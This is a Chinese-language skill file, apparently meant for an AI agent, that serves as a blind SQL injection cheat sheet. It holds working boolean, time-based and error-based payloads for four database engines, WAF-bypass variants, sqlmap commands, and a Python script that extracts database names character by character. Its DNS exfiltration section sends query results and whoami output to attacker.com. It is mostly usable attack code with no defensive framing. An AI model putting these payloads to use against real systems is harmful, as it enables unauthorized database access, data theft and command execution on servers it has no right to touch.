---
name: 盲sql注入
description: Use when encountering 盲sql注入技术 - 布尔盲注、时间盲注、报错注入、dns外带
---

# 盲SQL注入

## Info

- **Domain**: web
- **Tags**: web, sqli, blind

## 布尔盲注
```sql
' AND 1=1--   # 正常
' AND 1=2--   # 异常
' AND LENGTH(DATABASE())>5--
' AND ASCII(SUBSTRING(DATABASE(),1,1))>97--
' AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>97,1,0)--
```

## 时间盲注
```sql
# MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

# PostgreSQL
'; SELECT pg_sleep(5)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--

# Oracle
' AND DBMS_LOCK.SLEEP(5)=1--

# 条件延时
' AND IF(SUBSTRING(DATABASE(),1,1)='a',SLEEP(5),0)--
```

## 报错注入
```sql
# MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e))--
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e),1)--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT DATABASE()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--

# PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)--

# MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))--

# Oracle
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--
```

## DNS外带
```sql
# MySQL
LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.attacker.com\\abc'))

# MSSQL
EXEC master..xp_dirtree '\\\\' + (SELECT DATABASE()) + '.attacker.com\\abc'

# PostgreSQL
COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).attacker.com'

# Oracle
SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.com/') FROM dual
```

## SQLMap自动化
```bash
sqlmap -u "url?id=1" --technique=B     # 布尔
sqlmap -u "url?id=1" --technique=T     # 时间
sqlmap -u "url?id=1" --technique=E     # 报错
sqlmap -u "url?id=1" --dns-domain=attacker.com  # DNS外带
sqlmap -u "url" --level=3 --risk=3 --threads=10
```

## WAF绕过
```sql
# 替代函数
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--

# 编码绕过
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
```

## 手动猜解脚本
```python
import requests

def blind_sqli(url):
    result = ""
    for i in range(1, 100):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' AND ASCII(SUBSTRING(DATABASE(),{i},1))>{mid}--"
            r = requests.get(url + payload)
            if "正常" in r.text:
                low = mid + 1
            else:
                high = mid
        if low == 32: break
        result += chr(low)
    return result
```